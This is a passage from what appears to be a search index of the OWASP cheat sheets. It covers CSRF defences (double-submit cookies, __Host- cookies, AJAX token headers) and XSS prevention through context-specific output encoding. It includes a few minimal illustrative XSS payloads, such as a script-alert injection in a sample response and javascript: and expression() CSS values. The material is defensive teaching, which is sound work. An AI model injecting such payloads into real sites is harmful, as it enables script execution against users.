cover the edge cases mentioned above where these headers are not sent). Please note that, attackers can exploit this but people prefer to use this technique as a defense in depth measure because of the minor effort involved in deploying it.","title":"Identifying the Target Origin"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#double-submit-cookie","text":"If maintaining the state for CSRF token at server side is problematic, an alternative defense is to use the double submit cookie technique. This technique is easy to implement and is stateless. In this technique, we send a random value in both a cookie and as a request parameter, with the server verifying if the cookie value and request value match. When a user visits (even before authenticating to prevent login CSRF), the site should generate a (cryptographically strong) pseudorandom value and set it as a cookie on the user's machine separate from the session identifier. The site then requires that every transaction request include this pseudorandom value as a hidden form value (or other request parameter/header). If both of them match at server side, the server accepts it as legitimate request and if they don't, it would reject the request. Because subdomains can write cookies to the parent domains and because cookies can be set for the domain over plain HTTP connections this technique works as long as you are sure that your subdomains are fully secured and only accept HTTPS connections. To enhance the security of this solution include the token in an encrypted cookie - other than the authentication cookie (since they are often shared within subdomains) - and then at the server side match it (after decrypting the encrypted cookie) with the token in hidden form field or parameter/header for AJAX calls. This works because a sub domain has no way to over-write an properly crafted encrypted cookie without the necessary information such as encryption key. A simpler alternative to an encrypted cookie is to HMAC the token with a secret key known only by the server and place this value in a cookie. This is similar to an encrypted cookie (both require knowledge only the server holds), but is less computationally intensive than encrypting and decrypting the cookie. Whether encryption or a HMAC is used, an attacker won't be able to recreate the cookie value from the plain token without knowledge of the server secrets.","title":"Double Submit Cookie"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#cookie-with-__host-prefix","text":"Another solution for this problem is use of Cookie Prefixes for cookie with CSRF token. If cookie has __Host- prefix e.g. Set-Cookie: __Host-token=RANDOM; path=/; Secure then the cookie: Cannot be (over)written from another subdomain. Must have the path of / . Must be marked as Secure (i.e, cannot be sent over unencrypted HTTP). As of July 2020 cookie prefixes are supported by all major browsers except Internet Explorer . See the Mozilla Developer Network and IETF Draft for further information about cookie prefixes.","title":"Cookie with __Host- prefix"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#use-of-custom-request-headers","text":"Adding CSRF tokens, a double submit cookie and value, an encrypted token, or other defense that involves changing the UI can frequently be complex or otherwise problematic. An alternate defense that is particularly well suited for AJAX or API endpoints is the use of a custom request header . This defense relies on the same-origin policy (SOP) restriction that only JavaScript can be used to add a custom header, and only within its origin. By default, browsers do not allow JavaScript to make cross origin requests with custom headers. If this is the case for your system, you can simply verify the presence of this header and value on all your server side AJAX endpoints in order to protect against CSRF attacks. This approach has the double advantage of usually requiring no UI changes and not introducing any server side state, which is particularly attractive to REST services. You can always add your own custom header and value if that is preferred. This technique obviously works for AJAX calls, but you still need to protect <form> tags with approaches described in this document such as tokens. Also, CORS configuration should also be robust to make this solution work effectively (as custom headers for requests coming from other domains trigger a pre-flight CORS check).","title":"Use of Custom Request Headers"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#user-interaction-based-csrf-defense","text":"While all the techniques referenced here do not require any user interaction, sometimes it's easier or more appropriate to involve the user in the transaction to prevent unauthorized operations (forged via CSRF or otherwise). The following are some examples of techniques that can act as strong CSRF defense when implemented correctly. Re-Authentication (password or stronger) One-time Token CAPTCHA While these are a very strong CSRF defense, it can create a significant impact on the user experience. As such, they would generally only be used for security critical operations (such as password change, money transfers, etc.), alongside the other defences discussed in this cheat sheet.","title":"User Interaction Based CSRF Defense"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#login-csrf","text":"Most developers tend to ignore CSRF vulnerability on login forms as they assume that CSRF would not be applicable on login forms because user is not authenticated at that stage, however this assumption is not always true. CSRF vulnerabilities can still occur on login forms where the user is not authenticated, but the impact and risk is different. For example, if an attacker uses CSRF to authenticate a victim on a shopping website using the attacker's account, and the victim then enters their credit card information, an attacker may be able to purchase items using the victim's stored card details. For more information about login CSRF and other risks, see section 3 of this paper. Login CSRF can be mitigated by creating pre-sessions (sessions before a user is authenticated) and including tokens in login form. You can use any of the techniques mentioned above to generate tokens. Remember that pre-sessions cannot be transitioned to real sessions once the user is authenticated - the session should be destroyed and a new one should be made to avoid session fixation attacks . This technique is described in Robust Defenses for Cross-Site Request Forgery section 4.1 . If sub-domains under your master domain are not trusted in your threat model, it is difficult to mitigate login CSRF. A strict subdomain and path level referrer header validation can be used in these cases for mitigating CSRF on login forms to an extent.","title":"Login CSRF"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#java-reference-example","text":"The following JEE web filter provides an example reference for some of the concepts described in this cheatsheet. It implements the following stateless mitigations ( OWASP CSRFGuard , cover a stateful approach). Verifying same origin with standard headers Double submit cookie SameSite cookie attribute Please note that it only acts a reference sample and is not complete (for example: it doesn't have a block to direct the control flow when origin and referrer header check succeeds nor it has a port/host/protocol level validation for referrer header). Developers are recommended to build their complete mitigation on top of this reference sample. Developers should also implement standard authentication or authorization checks before checking for CSRF. Full source is located here and provides a runnable POC.","title":"Java Reference Example"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#javascript-guidance-for-auto-inclusion-of-csrf-tokens-as-an-ajax-request-header","text":"The following guidance considers GET , HEAD and OPTIONS methods are safe operations. Therefore GET , HEAD , and OPTIONS method AJAX calls need not be appended with a CSRF token header. However, if the verbs are used to perform state changing operations, they will also require a CSRF token header (although this is bad practice, and should be avoided). The POST , PUT , PATCH , and DELETE methods, being state changing verbs, should have a CSRF token attached to the request. The following guidance will demonstrate how to create overrides in JavaScript libraries to have CSRF tokens included automatically with every AJAX request for the state changing methods mentioned above.","title":"JavaScript Guidance for Auto-inclusion of CSRF tokens as an AJAX Request header"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#storing-the-csrf-token-value-in-the-dom","text":"A CSRF token can be included in the <meta> tag as shown below. All subsequent calls in the page can extract the CSRF token from this <meta> tag. It can also be stored in a JavaScript variable or anywhere on the DOM. However, it is not recommended to store it in cookies or browser local storage. The following code snippet can be used to include a CSRF token as a <meta> tag: < meta name = \"csrf-token\" content = \"{{ csrf_token() }}\" > The exact syntax of populating the content attribute would depend on your web application's backend programming language.","title":"Storing the CSRF Token Value in the DOM"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#overriding-defaults-to-set-custom-header","text":"Several JavaScript libraries allow for overriding default settings to have a header added automatically to all AJAX requests.","title":"Overriding Defaults to Set Custom Header"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#xmlhttprequest-native-javascript","text":"XMLHttpRequest's open() method can be overridden to set the anti-csrf-token header whenever the open() method is invoked next. The function csrfSafeMethod() defined below will filter out the safe HTTP methods and only add the header to unsafe HTTP methods. This can be done as demonstrated in the following code snippet: < script type = \"text/javascript\" > var csrf_token = document . querySelector ( \"meta[name='csrf-token']\" ). getAttribute ( \"content\" ); function csrfSafeMethod ( method ) { // these HTTP methods do not require CSRF protection return ( /^(GET|HEAD|OPTIONS)$/ . test ( method )); } var o = XMLHttpRequest . prototype . open ; XMLHttpRequest . prototype . open = function (){ var res = o . apply ( this , arguments ); var err = new Error (); if ( ! csrfSafeMethod ( arguments [ 0 ])) { this . setRequestHeader ( 'anti-csrf-token' , csrf_token ); } return res ; }; </ script >","title":"XMLHttpRequest (Native JavaScript)"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#angularjs","text":"AngularJS allows for setting default headers for HTTP operations. Further documentation can be found at AngularJS's documentation for $httpProvider . < script > var csrf_token = document . querySelector ( \"meta[name='csrf-token']\" ). getAttribute ( \"content\" ); var app = angular . module ( \"app\" , []); app . config ([ '$httpProvider' , function ( $httpProvider ) { $httpProvider . defaults . headers . post [ \"anti-csrf-token\" ] = csrf_token ; $httpProvider . defaults . headers . put [ \"anti-csrf-token\" ] = csrf_token ; $httpProvider . defaults . headers . patch [ \"anti-csrf-token\" ] = csrf_token ; // AngularJS does not create an object for DELETE and TRACE methods by default, and has to be manually created. $httpProvider . defaults . headers . delete = { \"Content-Type\" : \"application/json;charset=utf-8\" , \"anti-csrf-token\" : csrf_token }; $httpProvider . defaults . headers . trace = { \"Content-Type\" : \"application/json;charset=utf-8\" , \"anti-csrf-token\" : csrf_token }; }]); </ script > This code snippet has been tested with AngularJS version 1.7.7.","title":"AngularJS"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#axios","text":"Axios allows us to set default headers for the POST, PUT, DELETE and PATCH actions. < script type = \"text/javascript\" > var csrf_token = document . querySelector ( \"meta[name='csrf-token']\" ). getAttribute ( \"content\" ); axios . defaults . headers . post [ 'anti-csrf-token' ] = csrf_token ; axios . defaults . headers . put [ 'anti-csrf-token' ] = csrf_token ; axios . defaults . headers . delete [ 'anti-csrf-token' ] = csrf_token ; axios . defaults . headers . patch [ 'anti-csrf-token' ] = csrf_token ; // Axios does not create an object for TRACE method by default, and has to be created manually. axios . defaults . headers . trace = {} axios . defaults . headers . trace [ 'anti-csrf-token' ] = csrf_token </ script > This code snippet has been tested with Axios version 0.18.0.","title":"Axios"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#jquery","text":"JQuery exposes an API called $.ajaxSetup() which can be used to add the anti-csrf-token header to the AJAX request. API documentation for $.ajaxSetup() can be found here. The function csrfSafeMethod() defined below will filter out the safe HTTP methods and only add the header to unsafe HTTP methods. You can configure jQuery to automatically add the token to all request headers by adopting the following code snippet. This provides a simple and convenient CSRF protection for your AJAX based applications: < script type = \"text/javascript\" > var csrf_token = $ ( 'meta[name=\"csrf-token\"]' ). attr ( 'content' ); function csrfSafeMethod ( method ) { // these HTTP methods do not require CSRF protection return ( /^(GET|HEAD|OPTIONS)$/ . test ( method )); } $ . ajaxSetup ({ beforeSend : function ( xhr , settings ) { if ( ! csrfSafeMethod ( settings . type ) && ! this . crossDomain ) { xhr . setRequestHeader ( \"anti-csrf-token\" , csrf_token ); } } }); </ script > This code snippet has been tested with jQuery version 3.3.1.","title":"JQuery"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#references","text":"","title":"References"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#csrf","text":"OWASP Cross-Site Request Forgery (CSRF) PortSwigger Web Security Academy Mozilla Web Security Cheat Sheet Common CSRF Prevention Misconceptions Robust Defenses for Cross-Site Request Forgery","title":"CSRF"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html","text":"Cross Site Scripting Prevention Cheat Sheet \u00b6 Introduction \u00b6 This article provides a simple positive model for preventing XSS using output encoding properly. While there are a huge number of XSS attack vectors, following a few simple rules can completely defend against this serious attack. This article does not explore the technical or business impact of XSS. Suffice it to say that it can lead to an attacker gaining the ability to do anything a victim can do through their browser. Both reflected and stored XSS can be addressed by performing the appropriate validation and encoding on the server-side. DOM Based XSS can be addressed with a special subset of rules described in the DOM based XSS Prevention Cheat Sheet . For a cheatsheet on the attack vectors related to XSS, please refer to the XSS Filter Evasion Cheat Sheet . More background on browser security and the various browsers can be found in the Browser Security Handbook . Before reading this cheatsheet, it is important to have a fundamental understanding of Injection Theory . A Positive XSS Prevention Model \u00b6 This article treats an HTML page like a template, with slots where a developer is allowed to put untrusted data. These slots cover the vast majority of the common places where a developer might want to put untrusted data. Putting untrusted data in other places in the HTML is not allowed. This is a \"whitelist\" model, that denies everything that is not specifically allowed. Given the way browsers parse HTML, each of the different types of slots has slightly different security rules. When you put untrusted data into these slots, you need to take certain steps to make sure that the data does not break out of that slot into a context that allows code execution. In a way, this approach treats an HTML document like a parameterized database query - the data is kept in specific places and is isolated from code contexts with encoding. This document sets out the most common types of slots and the rules for putting untrusted data into them safely. Based on the various specifications, known XSS vectors, and a great deal of manual testing with all the popular browsers, we have determined that the rules proposed here are safe. The slots are defined and a few examples of each are provided. Developers SHOULD NOT put data into any other slots without a very careful analysis to ensure that what they are doing is safe. Browser parsing is extremely tricky and many innocuous looking characters can be significant in the right context. Why Can't I Just HTML Entity Encode Untrusted Data \u00b6 HTML entity encoding is okay for untrusted data that you put in the body of the HTML document, such as inside a <div> tag. It even sort of works for untrusted data that goes into attributes, particularly if you're religious about using quotes around your attributes. But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the encode syntax for the part of the HTML document you're putting untrusted data into. That's what the rules below are all about. You Need a Security Encoding Library \u00b6 Writing these encoders is not tremendously difficult, but there are quite a few hidden pitfalls. For example, you might be tempted to use some of the escaping shortcuts like \\\" in JavaScript. However, these values are dangerous and may be misinterpreted by the nested parsers in the browser. You might also forget to escape the escape character, which attackers can use to neutralize your attempts to be safe. OWASP recommends using a security-focused encoding library to make sure these rules are properly implemented. Microsoft provides an encoding library named the Microsoft Anti-Cross Site Scripting Library for the .NET platform and ASP.NET Framework has built-in ValidateRequest function that provides limited sanitization. The OWASP Java Encoder Project provides a high-performance encoding library for Java. XSS Prevention Rules \u00b6 The following rules are intended to prevent all XSS in your application. While these rules do not allow absolute freedom in putting untrusted data into an HTML document, they should cover the vast majority of common use cases. You do not have to allow all the rules in your organization. Many organizations may find that allowing only Rule #1 and Rule #2 are sufficient for their needs . Please add a note to the discussion page if there is an additional context that is often required and can be secured with encoding. Do NOT simply encode/escape the list of example characters provided in the various rules. It is NOT sufficient to encode/escape only that list. Blacklist approaches are quite fragile. The whitelist rules here have been carefully designed to provide protection even against future vulnerabilities introduced by browser changes. RULE #0 - Never Insert Untrusted Data Except in Allowed Locations \u00b6 The first rule is to deny all - don't put untrusted data into your HTML document unless it is within one of the slots defined in Rule #1 through Rule #5. The reason for Rule #0 is that there are so many strange contexts within HTML that the list of encoding rules gets very complicated. We can't think of any good reason to put untrusted data in these contexts. This includes \"nested contexts\" like a URL inside a JavaScript -- the encoding rules for those locations are tricky and dangerous. If you insist on putting untrusted data into nested contexts, please do a lot of cross-browser testing and let us know what you find out. Directly in a script: < script >... NEVER PUT UNTRUSTED DATA HERE ...</ script > Inside an HTML comment: <!--...NEVER PUT UNTRUSTED DATA HERE...--> In an attribute name: < div ... NEVER PUT UNTRUSTED DATA HERE ...= test /> In a tag name: < NEVER PUT UNTRUSTED DATA HERE ... href = \"/test\" /> Directly in CSS: < style > .. . NEVER PUT UNTRUSTED DATA HERE ... </ style > Most importantly, never accept actual JavaScript code from an untrusted source and then run it. For example, a parameter named \"callback\" that contains a JavaScript code snippet. No amount of encoding/escaping can fix that. RULE #1 - HTML Encode Before Inserting Untrusted Data into HTML Element Content \u00b6 Rule #1 is for when you want to put untrusted data directly into the HTML body somewhere. This includes inside normal tags like div , p , b , td , etc. Most web frameworks have a method for HTML encoding/escaping for the characters detailed below. However, this is absolutely not sufficient for other HTML contexts. You need to implement the other rules detailed here as well. < body > ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE... </ body > < div > ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE... </ div > Encode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ( & , < , > , \" , ' ): & --> &amp; < --> &lt; > --> &gt; \" --> &quot; ' --> &#x27; &apos; not recommended because its not in the HTML spec (See: section 24.4.1) &apos; is in the XML and XHTML specs. RULE #2 - Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes \u00b6 Rule #2 is for putting untrusted data into typical attribute values like width , name , value , etc. This should not be used for complex attributes like href , src , style , or any of the event handlers like onmouseover. It is extremely important that event handler attributes should follow Rule #3 for HTML JavaScript Data Values. Inside UNquoted attribute: < div attr = ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE ... > content Inside single quoted attribute: < div attr = '...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...' > content Inside double quoted attribute : < div attr = \"...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" > content Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the \"&#xHH;\" format (or a named entity if available) to prevent switching out of the attribute. The reason this rule is so broad is that developers frequently leave attributes unquoted. Properly quoted attributes can only be escaped with the corresponding quote. Unquoted attributes can be broken out of with many characters, including [space] % * + , - / ; < = > ^ and | . RULE #3 - JavaScript Encode Before Inserting Untrusted Data into JavaScript Data Values \u00b6 Rule #3 concerns dynamically generated JavaScript code - both script blocks and event-handler attributes. The only safe place to put untrusted data into this code is inside a quoted \"data value.\" Including untrusted data inside any other JavaScript context is quite dangerous, as it is extremely easy to switch into an execution context with characters including (but not limited to) semi-colon, equals, space, plus, and many more, so use with caution. Inside a quoted string: < script > alert ( '...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...' )</ script > One side of a quoted expression: < script > x = '...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...' </ script > Inside quoted event handler: < div onmouseover = \"x='...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...'\" </ div > Please note there are some JavaScript functions that can never safely use untrusted data as input - EVEN IF JAVASCRIPT ENCODED! For example: < script > window . setInterval ( '...EVEN IF YOU ENCODE UNTRUSTED DATA YOU ARE XSSED HERE...' ); </ script > Except for alphanumeric characters, encode all characters less than 256 with the \\xHH format to prevent switching out of the data value into the script context or into another attribute. DO NOT use any escaping shortcuts like \\\" because the quote character may be matched by the HTML attribute parser which runs first. These escaping shortcuts are also susceptible to escape-the-escape attacks where the attacker sends \\\" and the vulnerable code turns that into \\\\\" which enables the quote. If an event handler is properly quoted, breaking out requires the corresponding quote. However, we have intentionally made this rule quite broad because event handler attributes are often left unquoted. Unquoted attributes can be broken out of with many characters including [space] % * + , - / ; < = > ^ and | . Also, a </script> closing tag will close a script block even though it is inside a quoted string because the HTML parser runs before the JavaScript parser. Please note this is an aggressive encoding policy that over-encodes. If there is a guarantee that proper quoting is accomplished then a much smaller character set is needed. Please look at the OWASP Java Encoder JavaScript encoding examples for examples of proper JavaScript use that requires minimal encoding. RULE #3.1 - HTML Encode JSON values in an HTML context and read the data with JSON.parse \u00b6 In a Web 2.0 world, the need for having data dynamically generated by an application in a JavaScript context is common. One strategy is to make an AJAX call to get the values, but this isn't always performant. Often, an initial block of JSON is loaded into the page to act as a single place to store multiple values. This data is tricky, though not impossible, to encode/escape correctly without breaking the format and content of the values. Ensure returned Content-Type header is application/json and not text/html . This shall instruct the browser not misunderstand the context and execute injected script Bad HTTP response: HTTP/1.1 200 Date: Wed, 06 Feb 2013 10:28:54 GMT Server: Microsoft-IIS/7.5.... Content-Type: text/html; charset=utf-8 <-- bad .... Content-Length: 373 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive {\"Message\":\"No HTTP resource was found that matches the request URI 'dev.net.ie/api/pay/.html?HouseNumber=9&AddressLine =The+Gardens<script>alert(1)</script>&AddressLine2=foxlodge+woods&TownName=Meath'.\",\"MessageDetail\":\"No type was found that matches the controller named 'pay'.\"} <-- this script will pop!! Good HTTP response: HTTP/1.1 200 Date: Wed, 06 Feb 2013 10:28:54 GMT Server: Microsoft-IIS/7.5.... Content-Type: application/json; charset=utf-8 <--good ..... A common anti-pattern one would see: < script > // Do NOT do this without encoding the data with one of the techniques listed below. var initData = <%= data . to_json %> ; </ script > JSON serialization \u00b6 A safe JSON serializer will allow developers to serialize JSON as string of literal JavaScript which can be embedded in an HTML in the contents of the <script> tag. HTML characters and JavaScript line terminators need be encoded. Consider the Yahoo JavaScript Serializer for this task. HTML entity encoding \u00b6 This technique has the advantage that HTML entity encoding is widely supported and helps separate data from server side code without crossing any context boundaries. Consider placing the JSON block on the page as a normal element and then parsing the innerHTML to get the contents. The JavaScript that reads the span can live in an external file, thus making the implementation of CSP enforcement easier. < div id = \"init_data\" style = \"display: none\" > < %= html_encode(data.to_json) %> </ div > // external js file var dataElement = document . getElementById ( 'init_data' ); // decode and parse the content of the div var initData = JSON . parse ( dataElement . textContent ); An alternative to encoding and decoding JSON directly in JavaScript, is to normalize JSON server-side by converting < to \\u003c before delivering it to the browser. RULE #4 - CSS Encode And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values \u00b6 Rule #4 is for when you want to put untrusted data into a style sheet or a style tag. CSS is surprisingly powerful, and can be used for numerous attacks. Therefore, it's important that you only use untrusted data in a property value and not into other places in style data. You should stay away from putting untrusted data into complex properties like url , behavior , and custom ( -moz-binding ). You should also not put untrusted data into IE's expression property value which allows JavaScript. Property value: < style > selector { property : ... ENCODE UNTRUSTED DATA BEFORE PUTTING HERE ... ; } </ style > < style > selector { property : \"...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" ; } </ style > < span style = \"property : ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" > text </ span > Please note there are some CSS contexts that can never safely use untrusted data as input - EVEN IF PROPERLY CSS ENCODED! You will have to ensure that URLs only start with http not javascript and that properties never start with \"expression\". For example: { background-url : \"javascript:alert(1)\" ; } // and all other URLs { text-size : \"expression(alert('XSS'))\" ; } // only in IE Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the \\HH encoding format. DO NOT use any escaping shortcuts like \\\" because the quote character may be matched by the HTML attribute parser which runs first. These escaping shortcuts are also susceptible to escape-the-escape attacks where the attacker sends \\\" and the vulnerable code turns that into \\\\\" which enables the quote. If attribute is quoted, breaking out requires the corresponding quote. All attributes should be quoted but your encoding should be strong enough to prevent XSS when untrusted data is placed in unquoted contexts. Unquoted attributes can be broken out of with many characters including [space] % * + , - / ; < = > ^ and | . Also, the </style> tag will close the style block even though it is inside a quoted string because the HTML parser runs before the JavaScript parser. Please note that we recommend aggressive CSS encoding and validation to prevent XSS attacks for both quoted and unquoted attributes. RULE #5 - URL Encode Before Inserting Untrusted Data into HTML URL Parameter Values \u00b6 Rule #5 is for when you want to put untrusted data into HTTP GET parameter value. < a href = \"http://www.somesite.com?test=...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" > link </ a > Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the %HH encoding format. Including untrusted data in data: URLs should not be allowed as there is no good way to disable attacks with encoding/escaping to prevent switching out of the URL. All attributes should be quoted. Unquoted attributes can be broken out of with many characters including [space] % * + , - / ; < = > ^ and | . Note that entity encoding is useless in this context. WARNING: Do not encode complete or relative URLs with URL encoding! If untrusted input is meant to be placed into href , src or other URL-based attributes, it should be validated to make sure it does not point to an unexpected protocol, especially javascript links. URLs should then be encoded based on the context of display like any other piece of data. For example, user driven URLs in HREF links should be attribute encoded. For example: String userURL = request . getParameter ( \"userURL\" ) boolean isValidURL = Validator . IsValidURL ( userURL , 255 ); if ( isValidURL ) { < a href = \"<%=encoder.encodeForHTMLAttribute(userURL)%>\" > link </ a > } RULE #6 - Sanitize HTML Markup with a Library Designed for the Job \u00b6 If your application handles markup -- untrusted input that is supposed to contain HTML -- it can be very difficult to validate. Encoding is also difficult, since it would break all the tags that are supposed to be in the input. Therefore, you need a library that can parse and clean HTML formatted text. There are several available at OWASP that are simple to use: HtmlSanitizer An open-source .Net library. The HTML is cleaned with a white list approach. All allowed tags and attributes can be configured. The library is unit tested with the OWASP XSS Filter Evasion Cheat Sheet var sanitizer = new HtmlSanitizer (); sanitizer . AllowedAttributes . Add ( \"class\" ); var sanitized = sanitizer . Sanitize ( html ); OWASP Java HTML Sanitizer import org.owasp.html.Sanitizers ; import org.owasp.html.PolicyFactory ; PolicyFactory sanitizer = Sanitizers . FORMATTING . and ( Sanitizers . BLOCKS ); String cleanResults = sanitizer . sanitize ( \"<p>Hello, <b>World!</b>\" ); For more information on OWASP Java HTML Sanitizer policy construction, see here . Ruby on Rails SanitizeHelper The SanitizeHelper module provides a set of methods for scrubbing text of undesired HTML elements. <%= sanitize @comment . body , tags : %w(strong em a) , attributes : %w(href) %> Other libraries that provide HTML Sanitization include: HTML sanitizer from Google Closure Library (JavaScript/Node.js, docs ) DOMPurify (JavaScript, requires jsdom for Node.js) PHP HTML Purifier Python Bleach RULE #7 - Avoid JavaScript URLs \u00b6 Untrusted URLs that include the protocol javascript: will execute JavaScript code when used in URL DOM locations such as anchor tag HREF attributes or iFrame src locations. Be sure to validate all untrusted URLs to ensure they only contain safe schemes such as HTTPS. RULE #8 - Prevent DOM-based XSS \u00b6 For details on what DOM-based XSS is, and defenses against this type of XSS flaw, please see the OWASP article on DOM based XSS Prevention Cheat Sheet . Bonus Rule #1: Use HTTPOnly cookie flag \u00b6 Preventing all XSS flaws in an application is hard, as you can see. To help mitigate the impact of an XSS flaw on your site, OWASP also recommends you set the HTTPOnly flag on your session cookie and any custom cookies you have that are not accessed by any JavaScript you wrote. This cookie flag is typically on by default in .NET apps, but in other languages you have to set it manually. For more details on the HTTPOnly cookie flag, including what it does, and how to use it, see the OWASP article on HTTPOnly . Bonus Rule #2: Implement Content Security Policy \u00b6 There is another good complex solution to mitigate the impact of an XSS flaw called Content Security Policy. It's a browser side mechanism which allows you to create source whitelists for client side resources of your web application, e.g. JavaScript, CSS, images, etc. CSP via special HTTP header instructs the browser to only execute or render resources from those sources. For example this CSP: Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.tld Will instruct web browser to load all resources only from the page's origin and JavaScript source code files additionally from static.domain.tld . For more details on Content Security Policy, including what it does, and how to use it, see this article on Content Security Policy . Bonus Rule #3: Use an Auto-Escaping Template System \u00b6 Many web application frameworks provide automatic contextual escaping functionality such as AngularJS strict contextual escaping and Go Templates . Use these technologies when you can. Bonus Rule #4: Properly use modern JS frameworks \u00b6 Modern JavaScript frameworks have pretty good XSS protection built in. Usually framework API allows bypassing that protection in order to render unescaped HTML or include executable code. The following API methods and props in the table below are considered dangerous and by using them you are potentially exposing your users to an XSS vulnerability. If you really have to use them remember that now all the data must be sanitized by yourself. JavaScript framework Dangerous methods / props Angular (2+) bypassSecurityTrust React dangerouslySetInnerHTML Svelte {@html ...} Vue (2+) v-html Avoid template injection in Angular by building with --prod parameter ( ng build --prod ). Also remember to keep your framework updated to the latest version with all possible bugfixes. X-XSS-Protection Header \u00b6 The X-XSS-Protection header has been deprecated by modern browsers and its use can introduce additional security issues on the client side. As such, it is recommended to set the header as X-XSS-Protection: 0 in order to disable the XSS Auditor, and not allow it to take the default behavior of the browser handling the response. Check the below references for a better understanding on this topic: Google Chrome\u2019s XSS Auditor goes back to filter mode Chrome removed the XSS Auditor Firefox does not implement the XSSAuditor Edge retired their XSS filter OWASP ZAP deprecated the scan for the header SecurityHeaders.com no longer scans for the header XSS Prevention Rules Summary \u00b6 Data Type Context Code Sample Defense String HTML Body <span>UNTRUSTED DATA </span> HTML Entity Encoding (rule #1). String Safe HTML Attributes <input type=\"text\" name=\"fname\" value=\"UNTRUSTED DATA \"> Aggressive HTML Entity Encoding (rule #2), Only place untrusted data into a whitelist of safe attributes (listed below), Strictly validate unsafe attributes such as background, ID and name. String GET Parameter <a href=\"/site/search?value=UNTRUSTED DATA \">clickme</a> URL Encoding (rule #5). String Untrusted URL in a SRC or HREF attribute <a href=\"UNTRUSTED URL \">clickme</a> <iframe src=\"UNTRUSTED URL \" /> Canonicalize input, URL Validation, Safe URL verification, Whitelist http and HTTPS URLs only (Avoid the JavaScript Protocol to Open a new Window), Attribute encoder. String CSS Value html <div style=\"width: UNTRUSTED DATA ;\">Selection</div> Strict structural validation (rule #4), CSS Hex encoding, Good design of CSS Features. String JavaScript Variable <script>var currentValue='UNTRUSTED DATA ';</script> <script>someFunction('UNTRUSTED DATA ');</script> Ensure JavaScript variables are quoted, JavaScript Hex Encoding, JavaScript Unicode Encoding, Avoid backslash encoding ( \\\" or \\' or \\\\ ). HTML HTML Body <div>UNTRUSTED HTML</div> HTML Validation (JSoup, AntiSamy, HTML Sanitizer...). String DOM XSS <script>document.write(\"UNTRUSTED INPUT: \" + document.location.hash );<script/> DOM based XSS Prevention Cheat Sheet The following snippets of HTML demonstrate how to safely render untrusted data in a variety of different contexts. Safe HTML Attributes include: align , alink , alt , bgcolor , border , cellpadding , cellspacing , class , color , cols , colspan , coords , dir , face , height , hspace , ismap , lang , marginheight , marginwidth , multiple , nohref , noresize , noshade , nowrap , ref , rel , rev , rows , rowspan , scrolling , shape , span , summary , tabindex , title , usemap , valign , value , vlink , vspace , width . Output Encoding Rules Summary \u00b6 The purpose of output encoding (as it relates to Cross Site Scripting) is to convert untrusted input into a safe form where the input is displayed as data to the user without executing as code in the browser. The following charts details a list of critical output encoding methods needed to stop Cross Site Scripting. Encoding Type Encoding Mechanism HTML Entity Encoding Convert & to &amp; , Convert < to &lt; , Convert > to &gt; , Convert \" to &quot; , Convert ' to &#x27; , Convert / to &#x2F; HTML Attribute Encoding Except for alphanumeric characters, encode all characters with the HTML Entity &#xHH; format, including spaces. ( HH = Hex Value) URL Encoding Standard percent encoding, see here . URL encoding should only be used to encode parameter values, not the entire URL or path fragments of a URL. JavaScript Encoding Except for alphanumeric characters, encode all characters with the \\uXXXX unicode encoding format ( X = Integer). CSS Hex Encoding CSS encoding supports \\XX and \\XXXXXX . Using a two character encode can cause problems if the next character continues the encode sequence. There are two solutions (a) Add a space after the CSS encode (will be ignored by the CSS parser) (b) use the full amount of CSS encoding possible by zero padding the value. Related Articles \u00b6 XSS Attack Cheat Sheet: The following article describes how to exploit different kinds of XSS Vulnerabilities that this article was created to help you avoid: OWASP: XSS Filter Evasion Cheat Sheet . Description of XSS Vulnerabilities: OWASP article on XSS Vulnerabilities. Discussion on the Types of XSS Vulnerabilities: Types of Cross-Site Scripting . How to Review Code for Cross-site scripting Vulnerabilities: OWASP Code Review Guide article on Reviewing Code for Cross-site scripting Vulnerabilities. How to Test for Cross-site scripting Vulnerabilities: OWASP Testing 